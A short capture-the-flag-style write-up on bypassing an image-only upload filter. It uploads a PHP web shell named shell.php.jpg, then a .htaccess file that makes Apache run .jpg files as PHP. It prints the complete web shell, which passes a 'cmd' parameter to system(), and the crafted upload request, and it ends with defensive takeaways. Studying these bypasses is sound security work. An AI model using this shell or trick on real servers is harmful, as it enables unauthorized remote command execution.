# File Upload Bypass via .htaccess 
## Context

If a challenge involved a file upload functionality that only allows image extensions:

.jpg

.png

.gif

And if the goal was to achieve remote command execution by bypassing the upload restrictions.

## Initial Attempt: Double Extension Upload

first attempt to upload a PHP web shell using a double extension:

shell.php.jpg

The upload will be accepted because the file ended with .jpg if not use different extension bypass or even change the header to see the difference.

Web Shell Code 
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
If it executes by visiting the image link,then there is no need of using .htaccess.
### PHP code did NOT execute

If the server treats .jpg files strictly as images

## Bypass Technique: .htaccess Upload

To force PHP execution, use Caido/burp to replay/repeat the original image upload request.


### Changed the uploaded filename to:

.htaccess


Modified the request body as follows:
```
Content-Disposition: form-data; name="image"; filename=".htaccess"
Content-Type: image/jpeg

AddHandler application/x-httpd-php .jpg
```

This configuration tells Apache to treat .jpg files as PHP.

## Final Result

Revisiting the previously uploaded shell.php.jpg.
The PHP code will be executed by the server

We will obtain a working web shell

## Key Takeaways

Extension filtering alone is insufficient for secure file uploads

*.htaccess* files can be abused if upload restrictions are weak

Server-side handler configuration is critical

Double extensions may upload successfully but still require execution context
